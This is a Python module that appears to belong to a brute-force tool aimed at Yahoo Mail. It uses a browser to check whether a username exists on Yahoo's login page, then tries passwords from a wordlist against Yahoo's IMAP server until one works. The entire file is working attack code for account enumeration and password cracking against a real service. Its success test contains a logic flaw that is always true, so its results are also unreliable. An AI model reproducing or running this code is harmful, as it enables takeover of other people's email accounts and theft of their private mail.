import time
import imaplib


class Yahoo:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.host = 'imap.mail.yahoo.com'
        self.port = 993
        self.wordlist = wordlist
        self.delay = delay

    def check_user(self):
        self.browser.driver.get('https://login.yahoo.com/')
        try:
            input = self.browser.wait_until_element_exists('id', 'login-username')
            input.clear()
            input.send_keys(self.username)
            self.browser.driver.find_element_by_id('login-signin').click()
            if 'Sorry, we don&#x27;t recognize this email.' in self.browser.driver.page_source:
                return False
            elif 'fail' in self.browser.current_url:
                return False
            else:
                self.name = 'Not found'
                return True
        except BaseException:
            return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        IMAP4 = imaplib.IMAP4_SSL(self.host, self.port)
        for password in passwords:
            try:
                session = IMAP4.login(self.username, password)
                if (session == 'OK' or 'AUTHENTICATE completed'):
                    found = password
                    break
            except IMAP4.error:
                pass
            time.sleep(self.delay)

        IMAP4.logout()
        return found
